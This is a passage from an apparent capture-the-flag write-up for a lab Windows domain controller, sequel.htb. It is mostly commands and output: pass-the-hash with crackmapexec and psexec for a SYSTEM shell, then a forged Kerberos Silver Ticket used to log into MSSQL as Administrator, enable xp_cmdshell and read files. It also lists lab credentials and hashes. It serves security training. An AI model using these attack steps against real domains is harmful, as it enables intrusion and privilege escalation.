`crackmapexec smb 10.10.11.202 -u 'Administrator' -H ':A52F78E4C751E5F5E17E1E9F3E58F4EE' --shares`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Administrator:A52F78E4C751E5F5E17E1E9F3E58F4EE (Pwn3d!)
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$          READ,WRITE ←     Remote Admin
SMB         10.10.11.202    445    DC               C$              READ,WRITE      Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL          READ            Logon server share 
```

`impacket-psexec 'sequel.htb/Administrator@10.10.11.202' -hashes ':A52F78E4C751E5F5E17E1E9F3E58F4EE'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.11.202.....
[*] Found writable share ADMIN$ ←
[*] Uploading file SAWcaEQM.exe
[*] Opening SVCManager on 10.10.11.202.....
[*] Creating service pyuC on 10.10.11.202.....
[*] Starting service pyuC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is EB33-4140

 Directory of C:\Users\Administrator\Desktop

02/06/2023  03:43 PM    <DIR>          .
02/06/2023  03:43 PM    <DIR>          ..
11/04/2024  09:25 AM                34 root.txt ←
               1 File(s)             34 bytes
               2 Dir(s)   5,845,590,016 bytes free
```

`type root.txt`:
```
9f168*************************** ←
```

<🔄 Alternative Step>

The way that this machine is set up allows for another interesting solution. More specifically, this alternative approach requires us to have at least reached the point that we have the clear text password for the user `sql_svc `. This step is extremely important since this is a user account that runs the MSSQL service meaning that tickets to access this service will be encrypted with the password of the `sql_svc` user.

Following the logic of a Silver Ticket attack we could be able to forge a ticket in behalf of the user
`Administrator` to access the MSSQL service. Unfortunately, there is no Service Principal Name (SPN) set for this service instance so Kerberos isn't able to produce a valid Service Ticket for us that we could then try and alter.

In this case, we can use `ticketer` from `impacket`. This script, has the benefit that the ticket creation is done locally, meaning that there is no need to contact Kerberos on the remote machine and ask for a Service Ticket. Moreover, we have to keep in mind that the service is responsible for validating presented tickets and **not** Kerberos. So, even if Kerberos is unaware that MSSQL is running under `sql_svc` if we manage to craft a valid ticket locally for the `Administrator` user we should be able to access the service as this user.
First of all, we need to find out the domain SID. There are many way to get this since we have a valid pair of credentials for the user `sql_svc` but the easiest one is through WinRM.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`python3 -c "import hashlib; print('NTLM:' + hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex())"`:
```
NTLM:1443ec19da4dac4ffc953bca1b57b4cf ←
```

![Victim: sql_svc](https://custom-icon-badges.demolab.com/badge/Victim-sql%5F_svc-64b5f6?logo=windows11&logoColor=white)

`powershell.exe -c 'Get-ADDomain'`:
```
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=sequel,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=sequel,DC=htb
DistinguishedName                  : DC=sequel,DC=htb
DNSRoot                            : sequel.htb
DomainControllersContainer         : OU=Domain Controllers,DC=sequel,DC=htb
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-4078382237-1492182817-2568127209 ←
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=sequel,DC=htb
Forest                             : sequel.htb
InfrastructureMaster               : dc.sequel.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syst
                                     em,DC=sequel,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=sequel,DC=htb
ManagedBy                          :
Name                               : sequel
NetBIOSName                        : sequel
ObjectClass                        : domainDNS
ObjectGUID                         : 7c4ace6b-9788-44a5-a1a6-8424bcb61f5b
ParentDomain                       :
PDCEmulator                        : dc.sequel.htb
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=sequel,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.sequel.htb}
RIDMaster                          : dc.sequel.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=sequel,DC=htb,
                                     DC=DomainDnsZones,DC=sequel,DC=htb,
                                     CN=Configuration,DC=sequel,DC=htb}
SystemsContainer                   : CN=System,DC=sequel,DC=htb
UsersContainer                     : CN=Users,DC=sequel,DC=htb
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

Now, we can craft a ticket for the MSSQL service.
The `spn` parameter is needed to produce a valid ticket but we can place anything we want since it's not set to begin with.

`impacket-ticketer -nthash '1443ec19da4dac4ffc953bca1b57b4cf' -domain-sid 'S-1-5-21-4078382237-1492182817-2568127209' -domain 'sequel.htb' -spn 'fakespn/dc.sequel.htb' 'Administrator'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sequel.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache ←
```

Now, we export our ticket and authenticate to the service using Kerberos authentication.

`KRB5CCNAME=./Administrator.ccache impacket-mssqlclient -k -no-pass 'Administrator@dc.sequel.htb'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.
```
❌

`sudo ntpdate 10.10.11.202`:
```
2024-11-05 23:22:38.353373 (+0100) +28795.295712 +/- 0.028015 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28795.295712
```

`KRB5CCNAME=./Administrator.ccache impacket-mssqlclient -k -no-pass 'Administrator@dc.sequel.htb'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
``` 
SQL (sequel\Administrator  dbo@master)> enable_xp_cmdshell ←
INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami ←
output           
--------------   
sequel\sql_svc   

NULL 
```
```
SQL (sequel\Administrator  dbo@master)> SELECT x FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) R(x) ←
x                                         
---------------------------------------   
b'9f168c67404405c19deb016bc1aa5c6d\r\n' ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`echo 'TEST!!!' > ./TEST.txt`

`evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`:
```                                     
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

`upload ./TEST.txt`:
```
Info: Uploading /home/kali/TEST.txt to C:\Users\sql_svc\Documents\TEST.txt
                                        
Data: 8 bytes of 8 bytes copied
                                        
Info: Upload successful!
```

![Victim: sql_svc](https://custom-icon-badges.demolab.com/badge/Victim-sql%5F_svc-64b5f6?logo=windows11&logoColor=white)

`dir`:
```    Directory: C:\Users\sql_svc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2024   2:32 PM              8 TEST.txt ←
```

```
SQL (sequel\Administrator  dbo@master)> CREATE TABLE #errortable (IGNORE INT) ←
SQL (sequel\Administrator  dbo@master)> BULK INSERT #errortable FROM 'C:\\Users\sql_svc\Documents\TEST.txt' WITH ( FIELDTERMINATOR=',', ROWTERMINATOR='\n', ERRORFILE='C:\\Users\sql_svc\Documents\TEST2.txt' ) ←
ERROR(DC\SQLMOCK): Line 1: Bulk load data conversion error (type mismatch or invalid character for the specified codepage) for row 1, column 1 (ignore).
```

![Victim: sql_svc](https://custom-icon-badges.demolab.com/badge/Victim-sql%5F_svc-64b5f6?logo=windows11&logoColor=white)

`dir C:\\Users\sql_svc\Documents`:
```
    Directory: C:\Users\sql_svc\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2024   2:32 PM              8 TEST.txt
-a----        11/5/2024   2:47 PM              8 TEST2.txt ←
```

`get-acl TEST2.txt`:
```
    Directory: C:\Users\sql_svc\Documents


Path      Owner                  Access
----      -----                  ------
TEST2.txt BUILTIN\Administrators NT AUTHORITY\SYSTEM Allow  FullControl... ←
```

</🔄 Alternative Step>

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
